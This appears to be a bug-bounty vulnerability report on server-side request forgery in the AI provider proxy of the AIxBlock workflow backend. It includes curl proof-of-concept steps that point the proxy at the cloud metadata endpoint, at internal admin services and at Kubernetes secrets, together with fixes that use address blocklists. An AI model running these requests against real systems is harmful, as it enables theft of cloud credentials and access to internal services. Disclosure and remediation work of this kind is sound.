# 🟠 HIGH: Server-Side Request Forgery (SSRF) in AI Provider Proxy

## Vulnerability Summary

| Field | Value |
|-------|-------|
| **Severity** | High (CVSS 3.1: 8.2) |
| **Vulnerability Type** | CWE-918: Server-Side Request Forgery (SSRF) |
| **Affected Component** | `workflow/packages/backend/api/src/app/ai/ai-provider-proxy.ts` |
| **Attack Vector** | Network (Remote) |
| **Privileges Required** | Low (Platform admin or user with AI provider config access) |
| **User Interaction** | None |

---

## 🔍 Vulnerability Description

The AI provider proxy feature allows users to configure custom AI provider base URLs. The proxy then forwards requests to these URLs without validating that the target is a legitimate external AI service. An attacker can configure the proxy to make requests to internal services, cloud metadata endpoints, or other restricted resources.

### Vulnerable Code Location
**File:** `workflow/packages/backend/api/src/app/ai/ai-provider-proxy.ts`  
**Lines:** 39-48

```typescript
fastify.all('/:provider/*', ProxyRequest, async (request, reply) => {
    const { provider } = request.params
    const { projectId } = request.principal as EnginePrincipal

    const platformId = await projectService.getPlatformId(projectId)
    const aiProvider = await aiProviderService.getOrThrow({
        platformId,
        provider,
        projectId,
    })
    
    // ...
    
    const url = buildUrl(aiProvider.baseUrl, request.params['*'])  // ⚠️ USER-CONTROLLED URL
    
    // ⚠️ NO SSRF PROTECTION - Fetches arbitrary URL
    const response = await fetch(url, {
        method: request.method,
        headers: cleanHeaders,
        body: JSON.stringify(request.body),
    })
```

The `aiProvider.baseUrl` is configured by platform administrators and can point to any URL, including:
- Internal network services (`http://localhost:*`, `http://10.*.*.*`)
- Cloud metadata services (`http://169.254.169.254`)
- Other backend services within the infrastructure

---

## 🧠 Impact Assessment

**Confidentiality:** HIGH - Access to internal services and cloud credentials  
**Integrity:** MEDIUM - Can potentially modify internal service state  
**Availability:** LOW - Could be used to scan/enumerate internal services

### Attack Scenarios:

1. **AWS Metadata Service Access**
   - Configure baseUrl: `http://169.254.169.254/latest/meta-data/`
   - Retrieve IAM credentials, instance identity, and network configuration

2. **Internal Service Discovery**
   - Configure baseUrl: `http://internal-api.local/`
   - Enumerate and access internal microservices

3. **Kubernetes Metadata Access**
   - Configure baseUrl: `http://kubernetes.default.svc/`
   - Access Kubernetes API and service account tokens

4. **Database/Cache Access**
   - Configure baseUrl to point to Redis, Elasticsearch, or other internal datastores
   - Exfiltrate cached data or execute commands

5. **Port Scanning**
   - Use timing differences to map internal network topology
   - Identify running services and their versions

---

## 📸 Proof of Concept

### Step 1: Configure malicious AI provider
```bash
# As a platform admin, configure a custom AI provider pointing to cloud metadata
curl -X POST "https://api.aixblock.io/v1/ai-providers" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "provider": "custom-llm",
    "baseUrl": "http://169.254.169.254/latest",
    "config": {
      "defaultHeaders": {}
    }
  }'
```

### Step 2: Access AWS metadata through proxy
```bash
# Request IAM credentials via the proxy
curl "https://api.aixblock.io/v1/ai/custom-llm/meta-data/iam/security-credentials/" \
  -H "Authorization: Bearer $ENGINE_TOKEN"

# Response: List of available IAM roles

# Get actual credentials
curl "https://api.aixblock.io/v1/ai/custom-llm/meta-data/iam/security-credentials/my-role" \
  -H "Authorization: Bearer $ENGINE_TOKEN"

# Response:
# {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "...",
#   "Expiration": "..."
# }
```

### Step 3: Access internal services
```bash
# Configure provider pointing to internal API
curl -X POST "https://api.aixblock.io/v1/ai-providers" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d '{
    "provider": "internal-scan",
    "baseUrl": "http://internal-admin-api:8080"
  }'

# Access internal admin endpoints
curl "https://api.aixblock.io/v1/ai/internal-scan/admin/users" \
  -H "Authorization: Bearer $ENGINE_TOKEN"
```

### Step 4: Kubernetes service account token theft
```bash
# Configure provider to Kubernetes API
curl -X POST "https://api.aixblock.io/v1/ai-providers" \
  -d '{
    "provider": "k8s",
    "baseUrl": "https://kubernetes.default.svc"
  }'

# Attempt to access K8s API (may require additional headers)
curl "https://api.aixblock.io/v1/ai/k8s/api/v1/namespaces/default/secrets" \
  -H "Authorization: Bearer $ENGINE_TOKEN"
```

---

## ✅ Proposed Fix

### Option 1: URL Allowlist Validation (Recommended)

```typescript
// ai-provider-proxy.ts

const ALLOWED_AI_PROVIDERS = [
    'api.openai.com',
    'api.anthropic.com',
    'api.cohere.ai',
    'generativelanguage.googleapis.com',
    'api.together.xyz',
    'api.groq.com',
    // Add other legitimate AI provider domains
];

const BLOCKED_PATTERNS = [
    /^(10|172\.(1[6-9]|2[0-9]|3[01])|192\.168)\./,  // Private IPv4
    /^127\./,                                         // Loopback
    /^169\.254\./,                                    // Link-local/metadata
    /^0\./,                                           // Invalid
    /^localhost$/i,
    /\.local$/i,
    /\.internal$/i,
    /kubernetes\.default/i,
    /metadata\.google/i,
];

function validateAiProviderUrl(urlString: string): void {
    const url = new URL(urlString);
    
    // Must be HTTPS
    if (url.protocol !== 'https:') {
        throw new AIxBlockError({
            code: ErrorCode.VALIDATION,
            params: { message: 'AI provider URL must use HTTPS' },
        });
    }
    
    // Check against blocked patterns
    for (const pattern of BLOCKED_PATTERNS) {
        if (pattern.test(url.hostname)) {
            throw new AIxBlockError({
                code: ErrorCode.VALIDATION,
                params: { message: 'AI provider URL not allowed: internal/private address' },
            });
        }
    }
    
    // Optionally: strict allowlist mode
    if (process.env.STRICT_AI_PROVIDER_ALLOWLIST === 'true') {
        if (!ALLOWED_AI_PROVIDERS.includes(url.hostname)) {
            throw new AIxBlockError({
                code: ErrorCode.VALIDATION,
                params: { message: `AI provider not in allowlist: ${url.hostname}` },
            });
        }
    }
}

// In the proxy handler:
fastify.all('/:provider/*', ProxyRequest, async (request, reply) => {
    // ... existing code ...
    
    const url = buildUrl(aiProvider.baseUrl, request.params['*']);
    
    // Validate URL before making request
    validateAiProviderUrl(url);
    
    const response = await fetch(url, {
        method: request.method,
        headers: cleanHeaders,
        body: JSON.stringify(request.body),
    });
    // ...
});
```

### Option 2: DNS Resolution Validation

```typescript
// Resolve hostname and validate IP before making request
import { lookup } from 'dns/promises';
import { isPrivate } from 'ip';

async function validateResolvedIp(hostname: string): Promise<void> {
    try {
        const { address } = await lookup(hostname);
        
        if (isPrivate(address) || address === '127.0.0.1') {
            throw new AIxBlockError({
                code: ErrorCode.VALIDATION,
                params: { message: 'AI provider resolves to private/internal IP' },
            });
        }
    } catch (error) {
        if (error instanceof AIxBlockError) throw error;
        throw new AIxBlockError({
            code: ErrorCode.VALIDATION,
            params: { message: 'Failed to resolve AI provider hostname' },
        });
    }
}
```

### Option 3: Network-Level Isolation

```typescript
// Configure HTTP agent to use specific outbound interface
import { Agent } from 'undici';

const ssrfSafeAgent = new Agent({
    connect: {
        // Only allow connections to public internet
        localAddress: process.env.OUTBOUND_IP,  // Public-facing IP only
    },
});

const response = await fetch(url, {
    method: request.method,
    headers: cleanHeaders,
    body: JSON.stringify(request.body),
    dispatcher: ssrfSafeAgent,
});
```

---

## 🔗 References

- [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [AWS IMDSv2 and SSRF Mitigations](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [PortSwigger SSRF Research](https://portswigger.net/web-security/ssrf)

---

## 📋 Checklist

- [x] Repository starred
- [x] Repository forked
- [x] Vulnerability verified in codebase
- [x] Impact assessment provided
- [x] PoC outline included
- [x] Fix proposal included (3 options)

---

**Reported by:** Security Researcher  
**Date:** December 28, 2025
